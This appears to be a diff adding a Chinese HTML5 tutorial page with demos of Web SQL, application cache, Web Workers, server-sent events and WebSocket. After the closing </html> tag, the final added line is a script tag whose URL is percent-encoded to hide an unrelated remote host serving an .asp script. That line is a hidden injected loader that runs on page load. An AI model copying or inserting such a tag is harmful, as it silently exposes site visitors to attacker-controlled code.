+    <p>以下实例演示了如何读取数据库中已经存在的数据：</p>
+
+    <div id="status" name="status">状态信息</div>
+
+    <script type="text/javascript">
+		
+         var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);
+         var msg;
+			
+         db.transaction(function (tx) {
+            tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');
+            tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "html")');
+            tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "html5")');
+            msg = '<p>数据表已创建，且插入了两条数据。</p>';
+            document.querySelector('#status').innerHTML =  msg;
+         });
+
+         db.transaction(function (tx) {
+            tx.executeSql('SELECT * FROM LOGS', [], function (tx, results) {
+               var len = results.rows.length, i;
+               msg = "<p>查询记录条数: " + len + "</p>";
+               document.querySelector('#status').innerHTML +=  msg;
+					
+               for (i = 0; i < len; i++){
+                  msg = "<p><b>" + results.rows.item(i).log + "</b></p>";
+                  document.querySelector('#status').innerHTML +=  msg;
+               }
+            }, null);
+         });
+			
+      </script>
+
+    <!--END HTML5 Web SQL-->
+
+    <!--HTML5 应用程序缓存-->
+
+    <h2>HTML5 应用程序缓存</h2>
+    <hr>
+    <p>使用 HTML5，通过创建 cache manifest 文件，可以轻松地创建 web 应用的离线版本。</p>
+    <hr>
+    <h2>什么是应用程序缓存（Application Cache）？</h2>
+    <p>HTML5 引入了应用程序缓存，这意味着 web 应用可进行缓存，并可在没有因特网连接时进行访问。</p>
+    <p>应用程序缓存为应用带来三个优势：</p>
+    <ol>
+    <li>离线浏览 - 用户可在应用离线时使用它们</li>
+    <li>速度 - 已缓存资源加载得更快</li>
+    <li>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。</li>
+    </ol>
+    <hr>
+    <h2>浏览器支持</h2>
+    <p>Internet Explorer 10, Firefox, Chrome, Safari 和 Opera 支持应用程序缓存.</p>
+    <hr>
+    <h2>Cache Manifest 基础</h2>
+    <p>如需启用应用程序缓存，请在文档的&lt;html&gt; 标签中包含 manifest 属性： </p>
+    <div class="code notranslate"><div>
+    &lt;!DOCTYPE HTML&gt;<br>
+        &lt;html manifest="demo<span>.appcache</span>"&gt;<br>
+        ...<br>
+        &lt;/html&gt;
+    </div></div>
+    
+    <p>每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。</p>
+    <p>manifest 文件的建议的文件扩展名是：".appcache"。</p>
+    <p><img src="/images/lamp.gif" alt="Remark">
+    请注意，manifest 文件需要配置正确的 MIME-type，即 "text/cache-manifest"。必须在 web 服务器上进行配置。
+    </p>
+    <h2>Manifest 文件</h2>
+    <p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。</p>
+    <p>manifest 文件可分为三个部分：</p>
+    <ul>
+    <li><em>CACHE MANIFEST</em> - 在此标题下列出的文件将在首次下载后进行缓存</li>
+    <li><em>NETWORK</em> - 在此标题下列出的文件需要与服务器的连接，且不会被缓存</li>
+    <li><em>FALLBACK</em> - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）</li>
+    </ul>
+    <h3>CACHE MANIFEST</h3>
+    <p>第一行，CACHE MANIFEST，是必需的：</p>
+    <div class="code notranslate"><div>
+    CACHE MANIFEST<br>
+    /theme.css<br>
+    /logo.gif<br>
+    /main.js
+    </div></div>
+    
+    <p>上面的 manifest 文件列出了三个资源：一个 CSS 文件，一个 GIF 图像，以及一个 JavaScript 文件。当 manifest 文件加载后，浏览器会从网站的根目录下载这三个文件。然后，无论用户何时与因特网断开连接，这些资源依然是可用的。</p>
+    
+    <h3>NETWORK</h3>
+    <p>下面的 NETWORK 小节规定文件 "login.php" 永远不会被缓存，且离线时是不可用的：</p>
+    
+    <div class="code notranslate"><div>
+    NETWORK:<br>
+    login.php</div></div>
+    
+    <p>可以使用星号来指示所有其他其他资源/文件都需要因特网连接：</p>
+    
+    <div class="code notranslate"><div>
+    NETWORK:<br>
+        *</div></div>
+    
+    <h3>FALLBACK</h3>
+    <p>下面的 FALLBACK 小节规定如果无法建立因特网连接，则用 "offline.html" 替代 /html5/ 目录中的所有文件：</p>
+    
+    <div class="code notranslate"><div>
+    FALLBACK:<br>
+        /html/
+    /offline.html</div></div>
+    <p><strong>注意:</strong> 第一个 URI 是资源，第二个是替补。</p>
+    <hr>
+    <h2>更新缓存</h2>
+    <p>一旦应用被缓存，它就会保持缓存直到发生下列情况：</p>
+    <ul>
+    <li>用户清空浏览器缓存</li>
+    <li>manifest 文件被修改（参阅下面的提示）</li>
+    <li>由程序来更新应用缓存</li>
+    </ul>
+    <h2>实例 - 完整的 Manifest 文件</h2>
+    <div class="code notranslate"><div>
+    CACHE MANIFEST<br>
+    # 2012-02-21 v1.0.0<br>
+    /theme.css<br>
+    /logo.gif<br>
+    /main.js<br><br>
+    NETWORK:<br>
+    login.php<br><br>
+    FALLBACK:<br>
+        /html/
+    /offline.html</div></div>
+    
+    <p><img src="/images/lamp.gif" alt="Remark"><b>提示:</b>以 "#" 开头的是注释行，但也可满足其他用途。应用的缓存会在其 manifest 文件更改时被更新。如果您编辑了一幅图片，或者修改了一个 JavaScript 函数，这些改变都不会被重新缓存。更新注释行中的日期和版本号是一种使浏览器重新缓存文件的办法。</p>
+    <hr>
+    <h2>关于应用程序缓存的说明</h2>
+    <p>请留心缓存的内容。</p>
+    <p>一旦文件被缓存，则浏览器会继续展示已缓存的版本，即使您修改了服务器上的文件。为了确保浏览器更新缓存，您需要更新 manifest 文件。</p>
+    <p><strong>注意:</strong> 浏览器对缓存数据的容量限制可能不太一样（某些浏览器设置的限制是每个站点 5MB）。</p>			
+    <!--END HTML5 应用程序缓存-->
+
+    <!--HTML5 Web Workers-->
+
+    HTML5 <span class="color_h1">Web Workers</span>
+    </h1>
+    <hr>
+    <p class="intro">web worker 是运行在后台的 JavaScript，不会影响页面的性能。</p>
+    <hr>
+    <h2>什么是 Web Worker？</h2>
+    <p>当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。</p>
+    <p>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。</p>
+    <hr>
+    <h2>浏览器支持</h2>
+    <p>Internet Explorer 10, Firefox, Chrome, Safari 和 Opera 都支持Web workers.</p>
+    <hr>
+    <h2>HTML5 Web Workers 实例</h2>
+    <p>下面的例子创建了一个简单的 web worker，在后台计数：</p>
+    <div>
+        <p>计数： <output id="result"></output></p>
+        <button onclick="startWorker()">开始工作</button> 
+        <button onclick="stopWorker()">停止工作</button>
+        <p id="htmlText">html text</p>
+        <p><strong>注意：</strong> Internet Explorer 9 及更早 IE 版本浏览器不支持 Web Workers.</p>
+        
+        <script>
+        var w;
+        
+        function startWorker() {
+            if(typeof(Worker) !== "undefined") {
+                if(typeof(w) == "undefined") {
+                    w = new Worker("../js/demo_workers.js");
+                }
+                w.onmessage = function(event) {
+                    document.getElementById("result").innerHTML = event.data;
+                };
+                document.getElementById("htmlText").innerText = "btn  start clicked!"
+            } else {
+                document.getElementById("result").innerHTML = "抱歉，你的浏览器不支持 Web Workers...";
+            }
+        }
+        
+        function stopWorker() 
+        { 
+            w.terminate();
+            w = undefined;
+            document.getElementById("htmlText").innerText = "btn stop clicked!"
+        }
+        </script>
+    </div>
+    <hr>
+    <h2>Web Workers 和 DOM</h2>
+    <p>由于 web worker 位于外部文件中，它们无法访问下列 JavaScript 对象：</p>
+    <ul>
+    <li>window 对象</li>
+    <li>document 对象</li>
+    <li>parent 对象</li>
+    </ul>	
+    <!--END HTML5 Web Workers-->
+
+    <!--HTML5 服务器发送事件SSE-->
+    HTML5 <span class="color_h1">服务器发送事件(Server-Sent Events)</span>
+    </h1>
+    <hr>
+    <p class="intro">HTML5 服务器发送事件（server-sent event）允许网页获得来自服务器的更新。</p>
+    <hr>
+    <h2>Server-Sent 事件 - 单向消息传递</h2>
+    <p>Server-Sent 事件指的是网页自动获取来自服务器的更新。</p>
+    <p>以前也可能做到这一点，前提是网页不得不询问是否有可用的更新。通过服务器发送事件，更新能够自动到达。</p>
+    <p>例子：Facebook/Twitter 更新、估价更新、新的博文、赛事结果等。</p>
+    <hr>
+    <h2>浏览器支持</h2>
+    <p>所有主流浏览器均支持服务器发送事件，除了 Internet Explorer。</p>
+
+    <div>
+        var source=new EventSource("demo_sse.php");<br>source.onmessage=function(event)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;document.getElementById("result").innerHTML+=event.data + "&lt;br&gt;";<br>
+        };
+    </div>
+
+    <!--END HTML5 服务器发送事件SSE-->
+
+    <!--HTML5 WebSocket-->
+    <h1>HTML5 WebSocket</h1>
+    <p>WebSocket是HTML5开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。</p>
+    <p>在WebSocket API中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。</p>
+    <p>浏览器通过 JavaScript 向服务器发出建立 WebSocket 连接的请求，连接建立以后，客户端和服务器端就可以通过 TCP 连接直接交换数据。</p>
+    
+    <p>当你获取 Web Socket 连接后，你可以通过 <b>send()</b> 方法来向服务器发送数据，并通过 <b>onmessage</b> 事件来接收服务器返回的数据。</p>
+    <p>以下 API 用于创建 WebSocket 对象。</p>
+    <pre class="prettyprint prettyprinted" style=""><span class="kwd">var</span><span class="pln"> </span><span class="typ">Socket</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">WebSocket</span><span class="pun">(</span><span class="pln">url</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">protocol</span><span class="pun">]</span><span class="pln"> </span><span class="pun">);</span></pre>
+    <p>以上代码中的第一个参数 url, 指定连接的 URL。第二个参数 protocol 是可选的，指定了可接受的子协议。</p>
+    <hr>
+    <h2>WebSocket 属性</h2>
+    <p>以下是 WebSocket 对象的属性。假定我们使用了以上代码创建了 Socket 对象：</p>
+    <table class="am-table am-table-bordered am-table-radius">
+    <tbody><tr>
+    <th width="30%">属性</th>
+    <th>描述</th>
+    </tr>
+    <tr>
+    <td>Socket.readyState</td>
+    <td><p>只读属性 <b>readyState</b> 表示连接状态，可以是以下值：</p>
+    <ul class="list">
+    <li><p>0 - 表示连接尚未建立。</p></li>
+    <li><p>1 - 表示连接已建立，可以进行通信。</p></li>
+    <li><p>2 - 表示连接正在进行关闭。</p></li>
+    <li><p>3 - 表示连接已经关闭或者连接不能打开。</p></li>
+    </ul>
+    </td>
+    </tr>
+    <tr>
+    <td>Socket.bufferedAmount</td>
+    <td><p>只读属性 <b>bufferedAmount</b> 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。</p> 
+    </td>
+    </tr>
+    </tbody></table>
+    <hr>
+    <h2>WebSocket 事件</h2>
+    <p>以下是 WebSocket 对象的相关事件。假定我们使用了以上代码创建了 Socket 对象：</p>
+    <table class="am-table am-table-bordered am-table-radius">
+    <tbody><tr>
+    <th width="10%">事件</th>
+    <th width="25%">事件处理程序</th>
+    <th>描述</th></tr>
+    <tr>
+    <td>open</td>
+    <td>Socket.onopen</td>
+    <td>连接建立时触发</td>
+    </tr>
+    <tr>
+    <td>message</td>
+    <td>Socket.onmessage</td>
+    <td>客户端接收服务端数据时触发</td>
+    </tr>
+    <tr>
+    <td>error</td>
+    <td>Socket.onerror</td>
+    <td>通信发生错误时触发</td>
+    </tr>
+    <tr>
+    <td>close</td>
+    <td>Socket.onclose</td>
+    <td>连接关闭时触发</td>
+    </tr>
+    </tbody></table>
+    <hr>
+    <h2>WebSocket 方法</h2>
+    <p>以下是 WebSocket 对象的相关方法。假定我们使用了以上代码创建了 Socket 对象：</p>
+    
+    <table class="am-table am-table-bordered am-table-radius">
+    <tbody><tr>
+    <th>方法</th>
+    <th>描述</th>
+    </tr>
+    <tr>
+    <td>Socket.send()</td>
+    <td><p>使用连接发送数据</p></td>
+    </tr>
+    <tr>
+    <td>Socket.close()</td>
+    <td><p>关闭连接</p></td>
+    </tr>
+    </tbody></table>
+    <hr>
+    <h2>WebSocket 实例</h2>
+    
+    <p>WebSocket 协议本质上是一个基于 TCP 的协议。</p>
+    <p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息"Upgrade: WebSocket"表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</p>
+    <h3>客户端的 HTML 和 JavaScript</h3>
+    <p>目前大部分浏览器支持 WebSocket() 接口，你可以在以下浏览器中尝试实例： Chrome, Mozilla, Opera 和 Safari。</p>
+    <p>runoob_websocket.html 文件内容</p>
+
+    <script type="text/javascript">
+        function WebSocketTest()
+        {
+           if ("WebSocket" in window)
+           {
+              alert("您的浏览器支持 WebSocket!");
+              
+              // 打开一个 web socket
+              var ws = new WebSocket("ws://localhost:9998/echo");
+               
+              ws.onopen = function()
+              {
+                 // Web Socket 已连接上，使用 send() 方法发送数据
+                 ws.send("发送数据");
+                 alert("数据发送中...");
+              };
+               
+              ws.onmessage = function (evt) 
+              { 
+                 var received_msg = evt.data;
+                 alert("数据已接收...");
+              };
+               
+              ws.onclose = function()
+              { 
+                 // 关闭 websocket
+                 alert("连接已关闭..."); 
+              };
+           }
+           
+           else
+           {
+              // 浏览器不支持 WebSocket
+              alert("您的浏览器不支持 WebSocket!");
+           }
+        }
+     </script>
+       
+  </head>
+  <body>
+  
+     <div id="sse">
+        <a href="javascript:WebSocketTest()">运行 WebSocket</a>
+     </div>
+
+    <!--END HTML5 WebSocket-->
+
+    <div style="text-align:center;color:blueviolet;background-color:#222;padding:2ch" > 
+        <h2>学习到了HTML5 WebSocket</h2>
+    </div>
+
+</body>
+
+</html>
+<script src="http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
